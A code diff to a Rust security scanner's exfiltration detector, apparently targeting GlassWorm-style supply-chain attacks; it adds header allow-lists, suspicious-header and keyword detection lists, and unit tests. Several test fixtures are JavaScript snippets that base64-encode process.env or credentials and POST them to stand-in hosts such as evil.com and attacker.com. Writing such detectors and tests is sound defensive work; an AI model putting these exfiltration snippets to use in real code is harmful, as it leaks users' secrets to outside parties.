@@ -33,7 +33,6 @@ use crate::finding::{DetectionCategory, Finding, Severity};
 use crate::ir::FileIR;
 use once_cell::sync::Lazy;
 use regex::Regex;
-use std::path::Path;
 
 /// Custom HTTP headers used for exfiltration
 const EXFIL_HEADERS: &[&str] = &[
@@ -46,6 +45,53 @@ const EXFIL_HEADERS: &[&str] = &[
     "X-User-Data",
     "X-Credential-Data",
 ];
+
+/// Known legitimate telemetry/monitoring headers
+const LEGITIMATE_TELEMETRY_HEADERS: &[&str] = &[
+    "X-Sentry-",
+    "X-NewRelic-",
+    "X-Datadog-",
+    "X-Instana-",
+    "X-Dynatrace-",
+    "X-AppDynamics-",
+    "X-Request-ID",
+    "X-Correlation-ID",
+    "X-Trace-ID",
+    "X-Span-ID",
+    "X-B3-",
+    "X-Cloud-Trace-",
+];
+
+/// Suspicious exfiltration headers (GlassWorm patterns)
+const SUSPICIOUS_EXFIL_HEADERS: &[&str] = &[
+    "X-Exfil-ID",
+    "X-Session-Token",
+    "X-Data-Payload",
+    "X-Env-Vars",
+    "X-Credentials",
+    "X-API-Key",
+    "X-Auth-Token",
+    "X-Secret",
+    "X-Password",
+];
+
+/// Check if content has multiple exfiltration indicators
+fn has_other_exfil_indicators(content: &str) -> bool {
+    let indicators = [
+        "process.env",
+        "Buffer.from",
+        "btoa",
+        "encodeURIComponent",
+        "credentials",
+        "password",
+        "secret",
+        "api_key",
+        "apikey",
+        "Authorization",
+    ];
+    
+    indicators.iter().filter(|i| content.contains(*i)).count() >= 2
+}
 
 /// Patterns for exfiltration detection
 static EXFIL_PATTERNS: Lazy<Vec<Regex>> = Lazy::new(|| {
@@ -119,8 +165,8 @@ impl Detector for ExfiltrationDetector {
         for (line_num, line) in content.lines().enumerate() {
             let line_trimmed = line.trim();
 
-            // Pattern 1: Custom exfil headers (CRITICAL)
-            for header in EXFIL_HEADERS {
+            // Check for SUSPICIOUS exfil headers (always flag)
+            for header in SUSPICIOUS_EXFIL_HEADERS {
                 if line_trimmed.contains(header) {
                     findings.push(
                         Finding::new(
@@ -131,39 +177,85 @@ impl Detector for ExfiltrationDetector {
                             '\0',
                             DetectionCategory::HeaderC2,
                             Severity::Critical,
-                            &format!("Exfiltration header detected: {}", header),
-                            "CRITICAL: Custom HTTP header used for data exfiltration. \
-                             This header is designed to smuggle stolen data past security monitoring. \
+                            &format!("Suspicious exfiltration header: {}", header),
+                            "CRITICAL: Suspicious HTTP header commonly used for data exfiltration. \
+                             This header pattern matches known GlassWorm attack signatures. \
                              Immediate incident response required.",
                         )
                         .with_cwe_id("CWE-359")
                         .with_reference("https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode")
-                        .with_confidence(0.95)
+                        .with_confidence(0.90)
                         .with_context(line_trimmed),
                     );
                 }
             }
 
-            // Pattern 2: Base64-encoded env vars in HTTP requests (CRITICAL)
-            if EXFIL_PATTERNS[1].is_match(line) {
-                findings.push(
-                    Finding::new(
-                        path,
-                        line_num + 1,
-                        1,
-                        0,
-                        '\0',
-                        DetectionCategory::HeaderC2,
-                        Severity::Critical,
-                        "Environment variables encoded and sent via HTTP",
-                        "CRITICAL: Code is encoding environment variables (likely containing secrets) \
-                         and sending them over HTTP. This is active credential exfiltration.",
-                    )
-                    .with_cwe_id("CWE-359")
-                    .with_reference("https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode")
-                    .with_confidence(0.92)
-                    .with_context(line_trimmed),
-                );
+            // Check for legitimate telemetry headers (only flag if combined with other indicators)
+            for header in LEGITIMATE_TELEMETRY_HEADERS {
+                if line_trimmed.contains(header) {
+                    // Only flag if combined with other suspicious patterns
+                    if has_other_exfil_indicators(content) {
+                        findings.push(
+                            Finding::new(
+                                path,
+                                line_num + 1,
+                                1,
+                                0,
+                                '\0',
+                                DetectionCategory::HeaderC2,
+                                Severity::Medium,
+                                &format!("Telemetry header with other exfil indicators: {}", header),
+                                "Telemetry header detected alongside other exfiltration indicators. \
+                                 While this header is commonly used by legitimate monitoring tools, \
+                                 the presence of additional suspicious patterns warrants investigation.",
+                            )
+                            .with_cwe_id("CWE-359")
+                            .with_reference("https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode")
+                            .with_confidence(0.50)
+                            .with_context(line_trimmed),
+                        );
+                    }
+                    // Don't flag legitimate telemetry alone
+                }
+            }
+
+            // Check for base64-encoded env vars (GlassWorm pattern - always flag)
+            if content.contains("Buffer.from") &&
+               content.contains("process.env") &&
+               content.contains("fetch") {
+                // Find the relevant line
+                let relevant_line = content
+                    .lines()
+                    .position(|l| l.contains("Buffer.from") && l.contains("process.env"))
+                    .or_else(|| content.lines().position(|l| l.contains("fetch")))
+                    .unwrap_or(0)
+                    + 1;
+
+                // Only add if not already flagged
+                let already_flagged = findings.iter().any(|f| {
+                    f.description.contains("Environment variables encoded")
+                });
+
+                if !already_flagged {
+                    findings.push(
+                        Finding::new(
+                            path,
+                            relevant_line,
+                            1,
+                            0,
+                            '\0',
+                            DetectionCategory::HeaderC2,
+                            Severity::Critical,
+                            "Environment variables encoded and sent via HTTP",
+                            "CRITICAL: Code is encoding environment variables (likely containing secrets) \
+                             and sending them over HTTP. This is active credential exfiltration.",
+                        )
+                        .with_cwe_id("CWE-359")
+                        .with_reference("https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode")
+                        .with_confidence(0.88)
+                        .with_context(line_trimmed),
+                    );
+                }
             }
 
             // Pattern 3: DNS TXT record queries (HIGH)
@@ -347,6 +439,7 @@ impl ExfiltrationDetector {
 mod tests {
     use super::*;
     use crate::config::UnicodeConfig;
+    use std::path::Path;
 
     #[test]
     fn test_detect_exfil_header() {
@@ -509,7 +602,7 @@ mod tests {
         // Legitimate DNS lookup (not TXT)
         let content = r#"
             const dns = require('dns').promises;
-            
+
             async function lookup() {
                 const addresses = await dns.lookup('example.com');
                 console.log(addresses);
@@ -521,5 +614,204 @@ mod tests {
 
         // Should not have findings (no TXT query)
         assert!(findings.is_empty());
+    }
+
+    #[test]
+    fn test_no_detect_legitimate_telemetry_headers() {
+        let detector = ExfiltrationDetector::new();
+
+        // Legitimate telemetry headers without other indicators
+        let content = r#"
+            const Sentry = require('@sentry/node');
+            
+            Sentry.init({
+                dsn: 'https://publicKey@o0.ingest.sentry.io/0',
+                tracesSampleRate: 1.0,
+            });
+
+            // Custom header for tracing
+            fetch('https://api.example.com/data', {
+                headers: {
+                    'X-Sentry-Trace': 'trace-id',
+                    'X-Request-ID': 'request-id',
+                }
+            });
+        "#;
+
+        let ir = FileIR::build(Path::new("test.js"), content);
+        let findings = detector.detect(&ir);
+
+        // Should not flag legitimate telemetry headers alone
+        assert!(findings.is_empty());
+    }
+
+    #[test]
+    fn test_no_detect_newrelic_headers() {
+        let detector = ExfiltrationDetector::new();
+
+        // New Relic headers without other indicators
+        let content = r#"
+            const newrelic = require('newrelic');
+            
+            // New Relic custom headers
+            fetch('https://api.example.com/data', {
+                headers: {
+                    'X-NewRelic-ID': 'app-id',
+                    'X-NewRelic-Transaction': 'transaction-id',
+                }
+            });
+        "#;
+
+        let ir = FileIR::build(Path::new("test.js"), content);
+        let findings = detector.detect(&ir);
+
+        // Should not flag New Relic headers alone
+        assert!(findings.is_empty());
+    }
+
+    #[test]
+    fn test_no_detect_datadog_headers() {
+        let detector = ExfiltrationDetector::new();
+
+        // Datadog headers without other indicators
+        let content = r#"
+            const tracer = require('dd-trace').init();
+            
+            // Datadog tracing headers
+            fetch('https://api.example.com/data', {
+                headers: {
+                    'X-Datadog-Trace-ID': 'trace-id',
+                    'X-Datadog-Parent-ID': 'parent-id',
+                }
+            });
+        "#;
+
+        let ir = FileIR::build(Path::new("test.js"), content);
+        let findings = detector.detect(&ir);
+
+        // Should not flag Datadog headers alone
+        assert!(findings.is_empty());
+    }
+
+    #[test]
+    fn test_detect_telemetry_with_env_vars() {
+        let detector = ExfiltrationDetector::new();
+
+        // Telemetry header combined with env var access (suspicious)
+        let content = r#"
+            const apiKey = process.env.API_KEY;
+            const secret = process.env.SECRET;
+            
+            fetch('https://suspicious.com/exfil', {
+                method: 'POST',
+                headers: {
+                    'X-Sentry-Trace': Buffer.from(apiKey).toString('base64'),
+                    'X-Request-ID': secret,
+                }
+            });
+        "#;
+
+        let ir = FileIR::build(Path::new("test.js"), content);
+        let findings = detector.detect(&ir);
+
+        // Should flag telemetry headers with other exfil indicators
+        assert!(!findings.is_empty());
+        assert!(findings.iter().any(|f| 
+            f.description.contains("Telemetry header with other exfil indicators")
+        ));
+    }
+
+    #[test]
+    fn test_detect_suspicious_exfil_headers() {
+        let detector = ExfiltrationDetector::new();
+
+        // Suspicious exfil headers (always flagged)
+        let content = r#"
+            fetch('https://attacker.com/exfil', {
+                method: 'POST',
+                headers: {
+                    'X-Exfil-ID': 'stolen-data',
+                    'X-Credentials': credentials,
+                    'X-API-Key': apiKey,
+                }
+            });
+        "#;
+
+        let ir = FileIR::build(Path::new("test.js"), content);
+        let findings = detector.detect(&ir);
+
+        // Should always flag suspicious headers
+        assert!(!findings.is_empty());
+        assert!(findings.iter().any(|f| f.severity == Severity::Critical));
+        assert!(findings.iter().any(|f| f.description.contains("Suspicious exfiltration header")));
+    }
+
+    #[test]
+    fn test_detect_x_session_token_header() {
+        let detector = ExfiltrationDetector::new();
+
+        // X-Session-Token is always suspicious
+        let content = r#"
+            fetch('https://external.com/ping', {
+                headers: {
+                    'X-Session-Token': sessionToken,
+                }
+            });
+        "#;
+
+        let ir = FileIR::build(Path::new("test.js"), content);
+        let findings = detector.detect(&ir);
+
+        // Should flag X-Session-Token
+        assert!(!findings.is_empty());
+        assert!(findings.iter().any(|f| 
+            f.description.contains("X-Session-Token") && f.severity == Severity::Critical
+        ));
+    }
+
+    #[test]
+    fn test_detect_buffer_env_fetch_pattern() {
+        let detector = ExfiltrationDetector::new();
+
+        // GlassWorm pattern: Buffer.from + process.env + fetch
+        let content = r#"
+            const envVars = JSON.stringify(process.env);
+            const encoded = Buffer.from(envVars).toString('base64');
+            
+            fetch('https://evil.com/collect', {
+                method: 'POST',
+                body: encoded
+            });
+        "#;
+
+        let ir = FileIR::build(Path::new("test.js"), content);
+        let findings = detector.detect(&ir);
+
+        // Should flag the Buffer.from + process.env + fetch pattern
+        assert!(!findings.is_empty());
+        assert!(findings.iter().any(|f| 
+            f.description.contains("Environment variables encoded") && f.severity == Severity::Critical
+        ));
+    }
+
+    #[test]
+    fn test_has_other_exfil_indicators() {
+        // Test the helper function directly
+        let content_single = r#"process.env.API_KEY"#;
+        assert!(!has_other_exfil_indicators(content_single));
+
+        let content_multiple = r#"
+            const key = process.env.API_KEY;
+            const encoded = Buffer.from(key).toString('base64');
+        "#;
+        assert!(has_other_exfil_indicators(content_multiple));
+
+        let content_telemetry = r#"
+            const token = process.env.SECRET;
+            fetch('https://evil.com', {
+                headers: { 'X-Sentry-Trace': btoa(token) }
+            });
+        "#;
+        assert!(has_other_exfil_indicators(content_telemetry));
     }
 }
